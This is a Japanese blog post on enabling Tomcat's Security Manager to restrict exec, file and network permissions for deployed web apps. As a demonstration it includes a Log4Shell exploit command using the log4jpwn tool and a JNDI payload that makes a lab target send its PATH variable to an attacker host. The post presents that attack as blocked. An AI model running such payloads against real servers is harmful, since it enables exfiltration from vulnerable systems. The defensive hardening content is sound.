---
layout:        post
title:         "Tomcatでwarのexec実行やネットワーク接続を禁止する"
date:          2022-01-23
category:      Java
cover:         /assets/cover14.jpg
redirect_from:
comments:      true
published:     true
latex:         false
photoswipe:    false
# sitemap: false
# feed:    false
---

Tomcatのセキュリティマネージャを有効にして、Tomcatを起動することで、各jarファイルが実行できる権限を制限することができます。

/etc/tomcat/tomcat.conf
```conf
SECURITY_MANAGER="true"
```

制限される権限は以下のものがあります。セキュリティマネージャを有効にすることで、攻撃する際に使用される権限が制限されます。
- java.util.PropertyPermission : JVMプロパティへの読み書き権限
- java.lang.RuntimePermission : exitやexecなどのシステム関数の実行権限
- java.io.FilePermission : ファイルとディレクトリへの読み書き実行権限
- java.net.SocketPermission : ネットワークソケットの使用権限
- java.net.NetPermission : マルチキャストネットワークの使用権限
- java.lang.reflect.ReflectPermission : Javaクラスに対するリフレクションの使用権限
- java.security.SecurityPermission : セキュリティメソッドへのアクセス権限
- java.security.AllPermission : セキュリティマネージャーの制限なしで実行する権限

Log4j2の脆弱性 (Log4shell) を含むWebアプリで、環境変数の値を攻撃者サーバの8888番ポートに送信させる攻撃は、失敗するようになりました。
```bash
~]$ python3 log4jpwn/pwn.py --target http://192.168.56.105:8080/log4j2-vulnapp/ --exploit-host 192.168.56.104 --payload-query-string --leak '${env:PATH}'
 i| starting server on 0.0.0.0:8888
 i| server started
 i| setting payload in User-Agent header
 i| setting payload as query string 'name'
 i| sending exploit payload ${jndi:ldap://192.168.56.104:8888/${env:PATH}} to http://192.168.56.105:8080/log4j2-vulnapp/
 i| request url was: http://192.168.56.105:8080/log4j2-vulnapp/?name=%24%7Bjndi%3Aldap%3A%2F%2F192.168.56.104%3A8888%2F%24%7Benv%3APATH%7D%7D
 i| response status code: 500
```
セキュリティマネージャを有効にすることで、脆弱性を利用した攻撃はできなくなりましたが、エラーによってサービスが停止するようになりました。

注意点としては、構成によってはjarがロギングする権限もないため、セキュリティマネージャによってアクセス拒否してもログに残らず、何が発生したかわからない状態になる可能性があります。

デフォルトのTomcatセキュリティポリシーの場所は /etc/tomcat/catalina.policy です。

tomcat のセキュリティマネージャが有効化されて起動しているかの確認は、以下のコマンドを実行して java のオプションに `-Djava.security.manager` が含まれていれば、有効化されていることが確認できます。
```bash
~]$ ps auxw | grep tomcat | grep security
tomcat   14572  0.7  7.7 1426120 79028 ?       Ssl  12:00   0:11 java -Dlog4j.configurationFile=file:///etc/tomcat/log4j2.xml -classpath /usr/share/tomcat/bin/bootstrap.jar:/usr/share/tomcat/bin/tomcat-juli.jar:/usr/share/java/commons-daemon.jar -Dcatalina.base=/usr/share/tomcat -Dcatalina.home=/usr/share/tomcat -Djava.endorsed.dirs= -Djava.io.tmpdir=/var/cache/tomcat/temp -Djava.util.logging.config.file=/usr/share/tomcat/conf/logging.properties -Djava.util.logging.manager=org.apache.juli.ClassLoaderLogManager -Djava.security.manager -Djava.security.policy==/usr/share/tomcat/conf/catalina.policy org.apache.catalina.startup.Bootstrap start
```

以上です。

- 前回の記事：[Log4j2の脆弱性がSELinuxで防げるかを検証する](http://localhost:4000/blog/java/log4j2-vuln-and-selinux)


#### 参考文献
- [Apache Tomcat 9 -- Security Manager How-To](https://tomcat.apache.org/tomcat-9.0-doc/security-manager-howto.html)

